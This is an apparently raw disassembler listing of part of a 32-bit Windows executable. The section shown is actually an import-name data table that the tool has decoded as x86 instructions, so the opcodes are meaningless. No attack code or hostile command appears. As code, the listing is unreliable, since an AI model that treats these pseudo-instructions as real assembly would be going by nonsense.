  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
